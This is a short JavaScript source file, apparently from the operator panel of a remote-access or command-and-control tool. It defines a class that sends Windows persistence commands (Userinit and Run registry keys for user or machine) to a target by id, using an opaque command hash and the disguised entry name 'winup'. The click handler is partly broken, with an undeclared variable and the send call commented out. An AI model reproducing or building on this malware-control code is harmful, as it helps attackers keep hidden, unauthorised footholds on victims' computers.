
export class PersistenceOption{
    constructor(id){
        this.id = id;
        this.actions = {
            "USERINIT": "wininit",
            "Run (Local User)": "runlocaluser",
            "Run (Local Machine)": "runlocalmachine"
        }
    }

    async sendPersist(name, action) {
        const response = await fetch("/command/option/sendpersistence", {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({message:{command: "e5fcfe07178a109ea0c1e9bd7e9dd772",name:name, action:action}, id: this.id})
        });

        if (!response.ok) {
            throw new Error(`HTTP error! status: ${response.status}`);
        }

        const data = await response.json();
        return data.message;
    }

    action(event){
        const element = event.target;
        console.log(element);
        action = element.textContent.trim();
        const name = "winup"
        // sendPersist("winup", action)
        // .then(data => {
        //     // Do something with data
        // });
    }
}